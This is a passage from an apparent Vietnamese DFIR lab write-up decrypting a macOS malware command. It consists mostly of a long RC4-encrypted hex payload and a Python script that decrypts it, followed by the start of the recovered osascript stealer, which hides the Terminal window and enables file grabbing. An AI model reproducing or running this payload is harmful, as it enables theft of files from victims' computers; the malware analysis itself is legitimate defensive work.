cf29f08685463866c587af552cb9b21b0ebaa3fe8744f39cd69d7e85e652ee7b1d1b25233dde3d8faeae3fe03cfc3e16b1a83eab7a8d3b00ec28010e239c9292b448cfea4467fe247723de2c8f2ae261d2fab796e7a1fa40e839ce4d167fa36b0c7726815230b54ea004c820bf1ef53d707f15a63f4dfe037386db6f42a50446db0f6b1974dee34ae26f478bb3eb1c25a436b063785dcd26e879ef14011aeb23b0a8009dd47c925a3253bdbf7da5dce2796fc59c2e653f67fe3b2a4d75e6c54a3e3b06d11b59e59f591a2bcf0eb35e239afdac783bc0f914e64c32bb60936df92c0b0301509ab15390ce4ca128eccbc66368b64d44d47365974275c43a507bb7d576262d38b3de78da8e76ecdc020543fd9a28034129ee0087c2efd6d3f2d86794585b1bf07fa4bc90860a19c66128fe220c12f506ac146088a4d960bb72905c790e2fa99c50b29172eb92736bb323033ceae2884fe251aff7587e9b589dbafd807552fd20498ae3770a05c855326796a244c4a3ea840b77bf02597cc77b1332d2a2572f2d71d576a8085f94958f420fc57469c4771edc739e1a5cb274fcb382005931d3b2735df93f432524a1497ca81eef67d4cb9687d234ac50a0c1337c197961741d35b5f498b70a4eb26943a34936f990b36c6fc04bacbc975b4a9c58f8c6db30840cc57639f62978544d4804790f5db4659cc220199fde16a8deef1aea9c98b7d4808a782395e0988061cc8fa38f6dc7ef46dcd029f9ff0cfef81aa83670eb0b683d1ffe75f02cc00b735658f20ef3ffc733246976ef5d350b41c4cc60422c9ef76333df9caf75c24ea3362c817671e96be2a71f020f91836860482a813ac0dd8f439d6b8851ea898351442d1227ff5ae83a5c7e03b4107d59d83d5a8ede9a19da612c62c50a3f299b4f1ca4de0fb563560dc263caa1c8a13344ba683b475bca01cd22da23e59ed7ec6a1a908a28c975f5355daf621135dd8e0bbfcd10b329b91541201d5e92d37d82dc9e457dec1347f39df2032e65bebbbd0f36d76035e3755565750a7f5f6f65b5b81eb2ef24f5b2e328c4d73c4f002d826cd54f9aa47556d124fd03ebadad2a6e6f4dc83adc684a31e7453091478268272cb25b5c6d4d211245e29c010d1707a9832360ed9ac9a840bbe1c4a6e72a9a2532b11d221408e4e72bb5e8e6ab70f9b305491c96b271f517b2b22fdb3c146a7b8e3c483d44975106bf8f04a3447a8cf3f41eb7b32c8aa46af0c4a0c5dcff8570f01e075b41e0263975da628f07659ed17b4f45cc1e953a219c17c0582db0684db6882c75ad9db08278c5fa51ec159a752c12b9c5941fff8621590cf8da543071d055ae6ca704fc745158968a1f0bb5ba8897bacf96f9d763c466934ace36fdee9135b66f41ef518e84c60b00a79787e0e9916655a822bfea40577b63bc9dbe13228f41145203431ead1030af3a2082ff7eec78f97f8a66b01fe724a2bc7ec7c867099dd85bd0d43207e58398c1d6509d8c7504ffda07f93344c18ee9721af48125f84c720a867840ed3923cafd9f4de49813c16c786ff4fc2ce0dde28489b7040d5b44bc44c5eb263a7b64027b2e1c972fe05ad895a2587891a54664a4b0a0a89cf32e4f136c36c66f6826d5e9f0142e10e1ed14aca8dcd299185e84824ff54d557afcd88e7fbede1d3e7bb3840f1765c8b979c871f7ec00fb56514694d2224ad9634e217bcff304f8c55a144e4bec59b340452996a37ee5484235b2ec08ff3f2680ead81f1d32883662b1eccbe3ad925a53e11b9942b473a47d78dac771a09256ff1bebbb3873cbc63c619736b55938de18059dca31871aa0f765ef43488daa25a04ca20252ee3d8c37c577ebf90bef8da721067f467a8676e3221bced71ba25a499d9fa275a9546ce33c119b670811ba9de05eea078bdcb0f7afd1fbc95cf759b374f3f5840e6e1a93473b50b775d0f11e91956ae2682d0dba230cda8bba6c34609716f64092483770dde2153b59445925c75fb427a54e548c62290580886d5dfe5945b1d06ec628c4b96f9d684463f21b6ae1fd3a4ed07e2a9e1c8f7eaad75fb6091cb0de712c26da1d8d55c805a1a2533618b7b7cd6007ef21c1bc7a3309452daa8da7bb13b7993f8fb598da08ea8b8b254f3491cd9ec34c132f6675e37d592fa96df99ec9febdafc67275a1826f0d73cff8162c5962afa3c7414bc96cd9e9b04449c26ba3191c37ac6d67dbb72cc1cf76577d02f6436d39aaa6da019d584c454b208328d1d7246f301f017406c2914ae1ca8fd4eaeab371dfdd1d85adc3d2548e1a5708a07f992e35c30c9ab78fff76972a40e81a70311652eb562c58736b28cc51536692c5afc94863df0c287670a055ca85878ea424b938b3fd2ce4b077e081d6c61dd0b21dde284273aa33f71e41c0e08c3d1383a965e063430f48883698a62e6862bd9815a41d11ee01dad224c247aaef745f6f6a3f0b4a12ad6d0f8b278f1617070e0a2757f0a6fa037908ac4dedd0f57dd75bd1107ee69647d1f65da68d6de47fb4f118613040d798f42688379d31fe0bf6dce3fb5b81bb21601e02187e4cbb8439c4793d0974f93a469ac90de74c7cb035e72de15bb8e91c6a86656047a5a7c5caa45643f7e4b5de87380b378c59ccdfecc998d45edaa37351366dd82020ebc8de7c38ac64ad502501c7bb689387224b7ba4b4942d8be158458c3e663abee664b29bc0b0b188ed24081135f2253b32c535ec8d860c88af628638e6cf67bdceaf7f23ab3fabd54da927347ede6081d11822d28a6abebb01509b6674d16e00f5affba8de323c081fb43e070502e1b593380a5bbc2357b5d68f6b76cfdcd532f4d6534c55dfc257659aaa083e1003895e56124840d552d14242ee02fd1cf4e7e1cdc8044be411d61309b3a8416146bbd41c101b6b2bd74f728a995f23d973abca090d97ff76acadcf5e14e78d2acb195ac16b96122541298c28fb49bdb4c09825ee4414b73013a892789edac5626a22c7a27df779942a3a6b7da6eb1fa70841e175b63c29003f782fba7f662b72eed7d7c3b49a7c57eae4c9f9852cc8ed8675dc5f4b620e912a7231a049f678aa59ef11d61ba28d15c8a67663b94cbeb64b2fc87254a3a8a4e6f5c97fd116b23e472fb9e55976e6fba751de8f0e87b047540c15f9e8a0cd564ed3fdbf484de354b20b2a9ba611b70f12e68950a742c4f7a9ba9764cb44f2fb99d1bd3c0617cc6396c8331de79cfc79fd14f12f65cf363ae8fd62aa930f53e421a3d371b88c7acc998aa5d3407aecf0625c8c13534d91cde8b0367055c5c5ca113f77025956eaab8a7e1ecfc0afeb81a3bc424c904d391da4bb8f0e634fd21a89ecef6215069a0cde3e01b5ae51a02d8824a15c364b1337b66653ebb601cf87ec6875f467bb7c252d64aa84defafb108540265a14603372967414ed8e8b517e29c07e48b60b7aaa965e9f5f59ccbebcaf664bcaef2be5b89cbdf437a3ad83a7eb7d34f9fb55dba67397e70132eaa06d4d419dd2453fdccbe8393a6d10a8a31bcd6f5898b1044a01eed975dfc9e61849552daccd14c1b7bc30bf7b9b328f96bf54c8289ce83452ecd014552482d1b2c426cf2dabd0f4fad8c525b2e2a6d2aa9193e183842b71c6abd94adf0fa55c569faa63de7fc2465a25857e8acffdcc6ae826ce0f7d69225f5a9dcb426ea9d0f97cf4252c9533819dd4bc3fd5ffb0fd7c32d6410cea815d0a0ff43825836fe7162c374a5f85c714970f555581860b55d3690e4f051db85acddcfd3391edc40cfc14d12cfb15c9552d35cef4e90e0c4891306181613df0a6e54f9a502390e5a55238f6ed32bf299c053570ae38fa0e8e92afe95b012f8eae8e22fab23406f9e3ecf7d2d02ed669b72fe45ce792031ebf4a53e1bf6ebde6825f8a77173650517472cc57628572bd1b2c76eadb507078fa640ae031294faced3a1f0ccf7363cf66899ab0e3a27c542b32761d89814edf478b15ffa874f5b7f11983e4249e384130472a12ef661fb4c0f6e9fe35a057b29ef2ecf7ed509d7a906a6106376c838edf372c0cebd91969f41386ff5a23e2c1f1ff7a82e7946fa155a844819cb217e746780807214b27da26d0c4cb1d7916e4983da7c4e5f1d45cad813a6fdf5fc83c500e241cb3b5406ac05dcfcc57331c21ae3e1ba5bdd79851fb1211e08111b131918d19a88dc544445642177a8b0f377fe2fc8030aacca25c868d26b34b56c1aa68abd8ef9892d0f86dd50565fb2ec3ae22caf885a564f1c0218042daf21843e5f1f7e9ec6ae7d519101010d2dee5db33e2273b52ed20942b9cec3d78e935a65af572a295cf5b4393ed95cdfe5a7f00173b548fe528fd7618248b79026660aba312784be02956777424ad63f1865081b9e90314034fed18cea5f3931b9f304c965980020119ebeffee7d6a8db7ef42a9034325289936c5d53ccb893c7afb36eb9342244f794673db578c55513e7ccb79fda9da7110afbcd93f6e850662102615dd219f7616218b4c328da62c890ea67d68107d07dfffc05349d3d44f93bfea2bbb63a791d45dd7ec620618c0025d17db8a2bdec2c376571d473f56799d33cce50c8c46668914a6809848d2a698907d14e700f980b60c922ab9f34b9e5683ff53aaefa0a91c6c2324bb2cc5cb3f91bd2fec8e4bc9991ec87b75fa893dfe56f25d68b6a0fcbe553bf7b46f52f4e13c98f4334a111b8f2d4ce9ee26dc48050e0d5a4114d3815974aed1e0b9b7b9091af329cb429399e2002acb84851ac51ddff7a95bfe2713ad339306266e00cf82d009bf66e0c6b194466026cc34debc49857a0d57c0ab08bb3e1a506923e8c81f20f6838c7877de2176e5f0257e26dfb76bd38663e5fa0e919acfb390e9989d1e63aeb6091d6e290d881f28d5033adf060329c3fc959434ff7d419469f43083817d93e9536bd0afb9771e11f11a42cfcf0452ab0f1eca233b971175434cc87ac88dc15d1f2c9f8be5f08e4b9559a88b37b3e064e3171d45862d0e74e6b8ea6dfb62ee69bbb0e863a66c4ea794c02d66f858edb1765993ee60a620f2e75d64871eae2e9534e0f4d229d869c21fb745ec64a7a8fbf1693de8f728f76e9af4c61c878c47d2bfc101df9c1994bfd40c8f9e66b448988b071e923e349842ac89eeb18aacc8049c0f53d7b01c71360b3af1dbbcfa26f085be1e312619da123ae7e58b0ebf2f34a8af29f2648f39b2d5fcd5f9b9093ef45be7898b23836f5e54a3fb1d4a3800d63c10607dea3798229916f3bdeb9ff10fb4cbe1b0700aa33c8a3346c4748b563ba244bed07dffc6ed3931f772117d70e6b3e1fbd1d3aa9625d076b3025f486d11c47f583c893de20f9e6ae1fdaaa756a3e499b2eb7668e1f7a06adf3544f56765cfd0bcb7324fb21a1cea648ed1d8446c722429bfbaf91b5a8baeef0d8495a4fbb8a9a2ed59bb8b1c5affa610a6aec51db9b4db867548654366ba56a5006424567b93304be9c382569767a26497cc64cff3e7957600c15bd06392cc115584e5f3271a7cbfa6eb9418ada5cb615b638a335b09946a3231bae029734b85a01beade4e7bbf07a3375fed6820a15c18b05f4e396c655a9252258da9c360f86737b6b8ff708b57d4974ee39c52bddb79ff3842d62d8a3f2c3831ea4475ced154d11f2d7a27a566f31137b19cf575d764b9919b3d01bfb8141d50e95c32a7ee99f8c92a4faafc9c4dbf228684725116c1c32364ceddc27b8766fb8c73f9924d6deb694b65cacc5ccce1e7ba9ec2f7de7cc48b49ea5e32427da2b4ac1ff2f42f72d649e3f35d9890a3f239cfd449acfe0fe36bfea916fc9d130822b22b4d247c039c0edcf13a6716e1bce4f1a5e940fe6eacaad225b2846bc8b4aa5745696d2c46cdef76815e887cdd2873124f89a979d21ba66bfe8d93abc1e98a87b55e84636c69f2ae1c1aac88f84b31f82c3ccbb830e8717279548d94bafa5e289b50c66578e3b36c87b1555961dad54105bd249b5dc0498401029c1a1f45712ebdc911e0551b1d87305340ba94a34b7346318158b4b2cddbacac1ea6a85acbb3c28379e4a95b7526b76e7b96edfd632a95443046bab0ca9d13c085a74238fbfb0699ab75b06a00ab80b713c119c827f7f15200f8b2069b6018162804b9ab0692ddb6052ee9cb26d8b1a2d5145579909f21ecb9161d8aed44175466359052f1f5a6252ea164f3d9aae3c514474d57da1e4fdf4c60d2067ebc3c359882d65fef250ae0e675d28c524d04358870ed11a5208b327ff23f669d0b308a897001eb1f6d3b9e1b74d80268deb3efe5be660a7c11540d899296be7ae97b566546c7c30a79e18f0189ee7ff21782a8409c05c1f5fee273f97479c8a23423130039f29abbd7fc3d481036cb0264f09de63000ae55efc7926b3cb56161c716dade3f8b96073401bc00017ada2f2e1d84e432fcb4f2478378a38be25203a3f467187917eaa600c582d9985e6adc19707e1082e7a6fbe31a3a2895227fc6f3de9b0eb03466610ba2afa3722f374714686830385dbd3cea0d2f0a42f7f3257a2dc7ff318f4f85fa9b9eeea48e403d0b7f9d5373986202a15a4f2990122b9e95dfe23ce8199beeaaba24185bc60a694ed7ac1b1ce016c26f46ada14ce3688a5c22f86f3816d77176140c47359a1f484c5d5fa8e77d51a4a73195842aff6a53d6c23ebc427398fbb7ccf87715e953fd58f99745104c647af2772f4f4691c511d7100f121c9fb797e72b6c6d071aaf9034a4b46718d3252951cf7156be3e1b42d957386cfd6adbe19dcd95b1fe5a7b722d8aab145287c12881ce71e60bfc68e4ebd189fe95192ffcb2756370a73f1d279b10400bca40e6879b618582fe2f4f479ae95f58b5be2c8f8dccec76884af1bb3387bad19bd920344c640cb1ae2565c60fe833e7b95dbeea79edba5e8ab6b7db6634b507ee10d3d95ebb1177e94d32a77bdbd2bbf4e493573d4f3775014b26659274632d1754ad63848687cf59a3225dc79caa4b0dc3d28267e8077a0af0f69da1a8a56665b67a7ca0dcc1ab51dc01b287e3f69c61fbcf8aaf51aa94e451cbd4217e3b47e2391f093681ba64aa19da78a356123f0d0c73ca56902499a81eb1845dd36b543c4a2596f357853105aab71be42f85f6c97c7d0d6c5210e5cfc49d0cab1cd79beb2b4114107b584adf60bea239564515eff428de7d4409dafa444255f659ad84a5e47345986362382c1e32ba1d7979168dbc4d06771fa47224bab73155786ef7a7082db6f8d5854dd3158ba38bf717917141c946f01e6891b24fc638171681145b3e5597608ff4d7986576d2db661894fb87eb93747d649cc212d86ee54ac764339710051102fef6d9f2fc79fe633403743ced794d777a4480d7fd9bf251e40aa2ae665693dd8d66b2e23d637273220aeb197bcdb2f0f86d7f8c579cd23ba1fd5d3d23adf33739a470bbe70767f4a30774e280c6fe040d389cf3d4e77a49cb2cb1ce9f02e985a0e5ec407683226b9bc360f3a1588e837046779c4913d8b53e97305fd55132512c18256d5fdaec6a9d9aec1b134d87566b27c7c131d8c411daf7f99fb3e8948fbde8a2c77d32ea77fbce6c47a1a7bcc20e5a707e340ada36eef7b4b8c51bdf04f44cd8b545616ebf2e9a8655938b9c3d814981797a58b5f4c872470eabde73490e4021e936086e04c479fb88d4c575be6816772bc6e83a5432bbc1cc1c7f69a32ad73bbfa85f138016b2ebd4b5e24b8c07383fc185d42d6b9a53b922e1f080f5358fd1a0a2b4b42ac362c04ec5fc48403e5bdda326d37af7d3dd314c2ccf488988a640c93cafd0d3cbcb9d20f862dd7204e0feb36775af69f5858dea3cfac2a737597539439ad3f63a3e59e4ad1c7e1ea5d7a46c993eba708d5b177652d465da0bca8f0f01e1bc12bc78f39704f707f2682562715564389720d31c04bdb1aff1db3077300c93e81b76cde372acbef12cda43e3cbc0cc68d066f941eaf039fc56761812dd7438794e89f99ce139274a86b8fc74b442bbb4cf2292fea2178589e8fe4d8a4e320936db6ae9267437b494b654bd99a7f7d1543f0ce0b4347332cc24766c77640419717650e8fccc94f97a3fdc8c7d4f510229bb8a99bc29d85f060551880f5c1a763bc7e261bb3a078a19bb6f248f50a98369d3de8a14a16fa7d6074bc54ed61eb492d5c2aa015217368050ebacbce6e5f7f3ec1034d89c7654de299bd38f353b832c6ad7b06d4824c055fc7055a5000987d4c9b200b6bc920b0b4d807022bedeb0b5ebe2261130a8538416cf60c2d15adb0665915a0a93352fa4d471aad55be1198cfa8f656e00bd8f2e3219eba99c59db7a878d6cd9fa0b8d1910752c7aaf631b9d10866ad8091441a7824a5ce612b0f60f9ed79a073130389e37367f3871a6e78aece76787eebfc49be9b5d7fb7a0a3cf4c3d0709fb596af03ff267185bd79b0fa3311cdaaaf1ac10e4a6019fe380296c835aa842fdccb4a40fe082620c8112f4ad691eff20e9013d01a534c0b418e73eedf1fc7bbff3f154e9bb68950c68312d55f54ef8db8c3da37c9cd55372bacb3ec3a57be2f9143179da3b87614b5ca92639afa63a5961c9e2fb0b6fbb22909568eb4b53cb173941c5c0b8d940a57ce69dd6569ce1617c5ad1bcc3b941cf08c6dfb943d8aba2f3d4ad5cf679dbb9cbc85a4f1b7771e1c4039b41e26ad59580f47528a3486a0fbfb500caac214a15606de204ee630afdf2f0007259ca7f42d0d10e9b16c74da916671034e8df456135b15241173422c1b5ebaf1dec7aace98ed61f8ac56dbd61dec51de0c741dbe5c8343b61b52f45ff7cbc0c21d3d3c9040ac7568e575f6788feefa6cca2eda38a2d84872f8bcae111043b6ff4bc1241e53d16e9e039b75a2c84645da88f9372f05fc956934c5181d5e63276381307f62f484f6682a816a41277075e5e078622fab55a7e06e9ed12cf46a4df7adc145374a8cea158da60e01e6a6e6cf8152b8f5af7c92b75931d0ca2bb6f51708176c322227bd1ec3fada8b0dde74fe4432ee3a67c6319b990db2f8022ad991b02043a4168f91623c7c4e069f7f3d1cb1e41712611ebb568880a754ba8b59ff1c924303374295006d556370011ef867fe5b8455d7de8d12081cf91cc8b33e12bc76c848c412429b926d8871e68102f54a1f9c53e00619ec29b2037731e0b680699f8c02494a51fcfd8c05828cba1161f5b0319d17e7b25937d4f095e3751b5ceb24aa8aa4767a7668d2b15fcd28106d256f6e1794d77ade5e325d2c205ca869329d053aaa6f9cc816108bbc43930f3c2796c84f3456499fff8d8c7c10696d4e8661ff2b03176dc3208f4e681b66403b47fa4330f073a8316c496e1b1b52c0cedc8f9f6049ec0d82a920602396949b21e0a4b993ed2f3034d434367d4f8fc56e0e3e51542fcc6baa2f90a014537feb3d3ccf800097337111dcda406090055cf3f0f9a3c27e970e62517bcfd4164dab0f0f6fcd480e7474ca1bf1119a7ed1492f19b211aea2ccdecdb0449427850b93ec192f45f7af2155529b973e6347df5ffe3aacaed4df8960d851c4ca8586f84636ca1083e3a2f04f6e36878119a5d69f50a4b5deaeb714d6d5e9e744960c159d0b231fac3d4eee8b6661aba2b3440b8e44eef665f4262d6aec19450c99bfef1c80cd231b5d59343de87bc4487ed2a6ae268e84e96b2dd78c430ebaf778477371f4dacf5c078ccd07dc08cf083ff6adcb876c9edcab543d08bbf826e2ffb473d295f6148a0f41215e77844c43c0f4ae53a97e0c42340007c68caea6f9038e4fe24b523a09549e237510b599fcbd7729750c54da40e1cf6f32760e4e2dece7c8e8df3d5880dd4cddc53aadf069af380dd1bf4b6c7bb946b6955b78d13b5e18facf1975f0d64da6311dc338d8737f0fbc13b3493fd60cf7c57c1c298c4a6d5efa0002a2a95f3b08452dc3989c246e91e1de9b768267e424d39434e518a4cd896e8ae77c3cc43399fe7b4e122b7dd0f79db290efdaef6b27a6a67b146cde8bfea2a778ac0b7bc4a3e91ac46d783f118b4ef272f2be59dafacbda685bdbbe3e2e7be69a7247d8c5a054005c05673b504a57f9bd2dd07267321012b97f8bde384051ba3453db69917acccaa5d19205bb92316586f1905b31012f2eca1b903e9201850501d57674108b3202952093b3f442f2a3a4bb81d9067c6a98227366b089bf7917438dd5bcbcbfab0c763dbf21cdd01af55d31c82c4da119b4f25efee30ebc826a06af0f7c1159e821af83b7064be6b6e559bd5a7659dd83ebfdde7ccaa88fd02b269c9fe83f4bba047770ba22f6763f9322729e02b1b67b7cb40631096a69a727b5ffe15b0138fd2d46a1402b6661ea89a399a1dc9879098374d08a97d090b10bc36247d4afb9b6b1c6a6f30b17e015e4106c6e07f4b0f048e2357c565381105f4fc16a79b3e998d44b5d38c3dbbe7fef7b28cf4cb1c6dffb31205eeeddc44eb5524940454aff54aa3224c495471eead79ab6a183c2d02eb69586c296f936b5d2ba374bc0b2d46651ec6282a74e782de3d831a79d89aac6262a8adb60ac2bbe9767e4cca51479501edc493f5bad980fe6a368f4a085cd6e6085848e68988c32321db6584700475ea423b3c27a64e8a84c0221ff7e930751239d80c546b214ead908f138e6f2049a967711b3ca8107826af43e50b55838541c84c92c4fb1fde8d5ce1a769de1ceb6fb01adca408e8c5536c5226786be98dd6d02f8a1696516fe784b48bf4a8b206c2cbb75e2bbf68125c94dea99de0c65f105bf21d098eca5ba83293701608cc9297ff055e792c550344ec610ce0f958addda3abfa6572e3dbe2f02b5469be47c43612a6ae5c10856b654a371edd7b078cfc7e908cc484c1abfec9e44fa68335c03604384e874abaddf45f251b29cf929ee80608bfc8cac055adeb45a8b1739c527ebeb966314ad050fffb48c56465be88f43fdef0c4058217d5af2ba93a5481ac0f287edd4cec821f58b59eb13232b4939301a143143f7c01e94461aecd5d75df15bb44fcc7908b351dc2c0a26563df756ef30e15ec127a588ba825f7341625263112515bd6ea96e648afaaaa8734b0ebc6c68a9aa277745dc5f8e9ea39e1d95ddb14a0cad44e0786c6d42cf69107b3e607de70390279428d216669b34b647525cc4909b2da9c93578f106132afbcb46074abc1a92e3cb327887d37e3afb8f9c339091180fca5fe1169250b8f413e7e10de90f55ed010d1f5977af107ef23d800a5d58e09ae051c40ab3a69969a49ce52bdaec3a17479fde179298b96788bc87ef078369ae98ac898881ff18ed5542c2fe41d79eef7e660023b5d9851e9baebb7f16a5f0274030ad661278ed106ae12232e69a352e8cef05f971d556accc5c72dbef8adfdcc4059d86b34004a35159fe7d0723b04625c58f4e2230c8570fb6758bcf9b1612d87f995c1a8157283248c816670a19504c7c11c9f1f5f58e5a4445bd9869a44f29c13ddd173a82cac7da7b038d46463fa6456040f0695f513cfcd9824d42cd0c0f9b3692138c515f332bf98a0977b44442d079825738089163683e07e5263ae006dd7ad53278b23e8d9f784e6492c3a97da1a699723c47dcd8adc55d5b193f46b1a9d190eabaee16231cc64991e74ef370a42912dd918bdb46902563be788c51affd0918d1b3206ebeb4c509381165850ae7516c1214fe219a378e75c1df480d8d2b0be5b7229a1c5d2ca8204b051fe1ec50c087904feb7f3a049434230b5922635656eba89330a3aa8a30e86ef66effa7b288b4380a52d767bcefde3ce231dc4ffa08c627b48674f196ce8cc7fe8e5c00da4e62112c40e714cd68bfd3698c4abd04447f0f5fb5e25b8fc6d5810ca26e066bc5a08a5c4be4a72bb880153b7a26fbe0ecca8507ddbaf229b34114507d3f861b6d5baa4dc409fc9aa12bf7d52b8524183fbb1bcc61885c2c2a8ed029f46cddd733c26b90c73c39dceaef108b3efc8b6fdc580f14866077a408e4fef3074fdae1f4440b8140db41fdaf3169dd04bf32a139ac9d59406cd9247183faee73865c6877a472c3c6b992f27fcf69b80075d9713517f5c7b239c8e8f2f70905630f0787bbf5f0279df5cecb16b5595e7cde7e011e384549b2ccfe4238cfa4c9e579e60db2a3e6799fce90cd7007c133dbda5fdfedb5e24cab0349fcfc0274dcbd62dab0473d984f4a988c9183ab4b11dd4551136051a59285f447997caa84b39201176317e7a36dee67b9bb99593ef7f842e5505df306d52d1a4728990f240e4ad146fb8fb0d3dd9cba7df7c5e237e0f0284f0889a71069693758139dece296e3ebd92280e28c35d52061f7a522876b6b444db904dcb35e14a55fa17fc789e52b6e1d43ecce05896bd6d07e9e114471606db7ca89a35c4962448d396528b0aa16a797d0400977f8d747f43e9ba6fa63c3995129b358147a90ad9b642ada8f22ed2e765a66ad71ab6962cf746aa5751ef3a79f6bf26872fe1b9e3be15b1b9a162e8da5a0242a178189e5e7af9387227e2446b6cd7bb008eb240f02b3b0b8168f6ad4afb8eaa2924e82762d9cb5bb34f3a3ea71020136a5bcfcf04e4b7e7a77bee9a3eb229ca2b2bbceea418490df2c82c29168bd4cf691c6cfe0f15effc523194ac364698b3019729d22f8878f6c9a5c074ef1027e0eb4a784123a4ba10e0c33fd926dcf017ddd07620ff7c02b1644cdcdf8a00c876b2efc2a2e26ee963d647c0fb55044ffa24d2714882246a128159431911e515d782613135181be76a9480158629d22d7c6d5989c448a7db9db83d4e5dc530fcd31da153c07d28d6bd5cb34221b4972e9194af6d13c5087cf27c98d1830d761779a943c5f16bde6aebd78d174fc5c6706bd628ba6f8c179d549a8919ba23136eaa019f8d18f7ffbdfc09c1bc56b686331255f7fe7e1398d0b800e2b3d12f386a1b679c9d6903465105df91efadd061ae4af23c396414bfa9ca780213d4b3e105f7a8ed66ef75435c1d4e42ed7b2892f41574673380f284d6133b7fa54fd2b44caac11dcc5525acbf129b3e7206ff27f685054522c7a3e76614737095cf803ebbb1da1d86715e76fcce9c401a3ab37d330939252d649de3b63d6a20cb49fe778a499682749484ae7dfaf59b6c803a6a0776c262b10eeb15282d9a48d3dd4625b0eb97a7a327132605666a5636a24a2c0659ccd4719fd8dee6b7b598e27fa6f68e5b263f3faf4efee121d23b94a2b8b3f4e06aefab9b296c358a87ccc542a378ffa4e77e25128976aaeff067dd28378208e947e106e2d00a55ade918772a7ef79756e3cd527c88d46089f6084123b690eff4cbb20361cd86be77ef42631cb59edcd6a2e6cf9980e8cd8cedd9466a362bbf5d7a9efccfff1adf98e728e3d6e8d00086e3ecd49e947e9a652c65743ec7efc32623e60b3ea063d7090a363d9648f029a0a444e671440f93b258d1f75e74d4037840f40c6510c9b991ef4a9baedc2f9152e7e4fa399b2608571b5e609c2ed16b76647d9a6744de983fe9a2b2733cd537bd4a8850aa83b99b4326a6b4c83ea86c7ac94aea622fd83aaf38561be8ff9820c79d6df5fa1e35663bf708829e9f02286fd3fe45fc564cf3366bf6ac36caf66e0af766ff270043ec46380c869a6d317269e31828b9875ffc2a316ceddc5bb0a512c58fa7786ff4b34983a3f663a68158a3a284ec0e5d10b38dd1bdfd006ee81ac51c1c342f52454f7edc66f6a493ac7440c91228ab9d6dbbc5b64b3b5fc3cadea62ae59e3e65e14859d3e1cd6012a2f4ee04836a59b3ec1a0aa10fb166f6255aca125507e0c2083b32b77ef499c610c48919a23b4c15717fa133b4326b90e36b6b535039927aedde1f9f9efd69f8c3d099dbc2f43838ad881a5139056a7c41a582246e16be881b0c7b45ec64a958f0738ecea0f780ce7f574b55e4dde7c04be2a8dee9ad8fffe42ee1201439f3f247aa0051bee7c17cff12db938f733f465a121a091918036e8916df157a1e5d3c2ed683818f2e6f51f0a6067e9f13c24bbf22e028d1f5edaf02948d5c62a3674f23ce12a8afd7ed6999717beff47ea2100436f6c30e4344dd813d3b81d846b0bc9ba1a8020af047815e567432b770f7104b5ea0c0891df9a269de3b24cf71693392a3a5d690975104842531b88ae27d9183e74b258c9d2cff352f0d583d41f16e1387c70478ec144a5d51ead17546374d96a3c4f1f8d2a14b87b0252e70cda9956fe6e9a394f903515ca2d1bee7ed7c16f6a00cc0485337dd7daa2d88e02ec1e983333f96d62d8d58a97b8fbed3d852d40c67a959a916f9e2a91fd21e10a13c0883e8e5ec3bbadaa197a09cf1b6f4ff4dcf7b5771ea71ad4bd23a74428104fda5d53c5820f232c98861a2a0d82818f7ac9c131b03108e9d557aaa1d6f0a09aa038839666914a3cd2c1431993d5343f2f37c34f34709b2299fd13d43cdc00ea2d92186101875e1c4075de130e669119b06434b69721dd784b8c10e888f8d40bb32d0b425c1e42a1e5be15be2b7d681666f6bc6b93bb9f9d1e67b7f974768a03e190e7609b16cc3792389c706df8604a4a083e6faf74e0d925643a38bc5f7bd2ca8cfd573f666482307f83f942dd9a0b1899b779bbd46c690147683be64a22a52c0e66f2cbee3ce2571083592d2bcb32ded41968161dfebd28ac707c46a3ec1ab29f33ba829cc61c89e19e51658ed314a776a4fcc22733348f1c9889768737e5daef2deb79a65345df717ddf52f21818ed4f071930386a04b984c9b7841cb7cf7345ae9e704f4102f7c4d51c3fc1b230b6a08c6995a3d7f9f3c2b9f3de75da663d03798f7a164b169e778267553f62202c0f51d5ab56621e77cae3bad6773dab198f4006d4279361841263b1f361b1cd87806424ff7903ee008c15c96ed7b0eaa5cfdd110c15e3a975baf84a76864484267d7e976a1d6d7f697bf4650e881691183e24b5081ba474c30657a20b69cce40e3ef3a28f70b10cefcf65f59e7771fcbffe68e2261de4aae5de1928f55e7319caf5e473261befed7beac2fa51312cadb85f423c6290a3f493a457e2a5a49bb23cf657ae0bbab2a53c54bd0adc468120ffae8f33e43f9f12072b52b919f198ae9058447a526902bc0fba3522d9ba9be6c1fa01b386e25e0117ea2287dca6307f3c97b0629c17f2879c0a7ab24a071620b9dac0177a68a5fe5d291fe2a853a48269738445113ea13084182049a28a08d993d616728fabfec24147ea1004b55099bc10a849e38cb251288db5cec47d2e05bc734c2c1d0b3bf32dab6cf67620788c2d8e9d8a91ede9ccbb75bd59a7ab6b56ae3d455cd0621d9d39ddcd2b915820c819f712920124923240141a7993f1bea1c165837b81b819cd738446fb01aa67a9dab00e7711ddb4c12ca83edc2ec41aea5285519fddbf4cf8ce59b0cb00164ba6684d90133b0ae9b4bafe65f9762944eb81f8156ff9274ca43b1321408be7a90aac979c36e60c12d4f321ace1f97b090f2447133864d8b9b1c8b34839622c5b0dd955fe3efac788fe8a01e7d4188e47876f913d2492065e9c60fb0825c9f629bee03f0ef7ea57d9da1cd68889fa46e914c28db1efe9124d660892f34c276f3f89e7814991e9f3177f7bf94c5bc39fe886a8074013ab2e7baab714789b7b25e0e0fde3f3d71bd45d51635b7071aa17410c6cc7a6e21310fa149fb4c833239e899eaceea8a9110279518f890f8c5ded9a8555a9be5e9208d15389d5799fc9816bcbcf9e562096911877f67dc09bc"

# Tự động loại bỏ ký tự lẻ bị cắt dở ở cuối chuỗi
if len(encrypted_cmd_hex) % 2 != 0:
    encrypted_cmd_hex = encrypted_cmd_hex[:-1]

encrypted_cmd = bytes.fromhex(encrypted_cmd_hex)

# Sử dụng errors='ignore' để bỏ qua lỗi text ở byte cuối cùng bị mất
decrypted_cmd = rc4_decrypt(encrypted_cmd, key)

print("[+] LỆNH THỰC THI CỦA MÃ ĐỘC LÀ:")
print("-" * 50)
print(decrypted_cmd.decode('utf-8', errors='ignore'))
print("-" * 50)
```
Sau khi cho chạy mình thu được 1 đoạn osa script:
```
osascript -e '
set release to true
set filegrabbers to true
if release then
        try
                tell window 1 of application "Terminal" to se
--------------------------------------------------
PS D:\DFIR LABS> python solve.py
[+] LỆNH THỰC THI CỦA MÃ ĐỘC LÀ:
--------------------------------------------------
osascript -e '
set release to true
set filegrabbers to true
if release then
        try
                tell window 1 of application "Terminal" to set visible to false
        end try
end if
on filesizer(paths)
        set fsz to 0
        try
